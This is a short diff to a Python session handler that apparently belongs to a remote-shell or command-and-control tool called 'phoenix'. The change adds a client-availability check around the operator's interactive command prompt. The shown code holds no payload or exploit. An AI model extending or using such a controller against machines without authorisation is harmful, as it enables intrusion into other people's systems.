@@ -17,15 +17,18 @@ class sessionHandler():
         self.client = tcpclient
     def interactive(self):
         try:
-            while self.interact:
-                cmd = input(f"phoenix({self.client.name})> ")
-                cmd = cmd.rstrip(' ')
-                if self.client.dead == False:
-                    self.command_interpreter(cmd)
-                else:
-                    print("[!] The connection is semms to Dead!")
-                    self.interact = False
-                    break
+            if self.client.available == True:
+                while self.interact:
+                    cmd = input(f"phoenix({self.client.name})> ")
+                    cmd = cmd.rstrip(' ')
+                    if self.client.dead == False:
+                        self.command_interpreter(cmd)
+                    else:
+                        print("[!] The connection is semms to Dead!")
+                        self.interact = False
+                        break
+            else:
+                print("Interactive shell is temporary unavailable.")
         except KeyboardInterrupt:
             pass
         
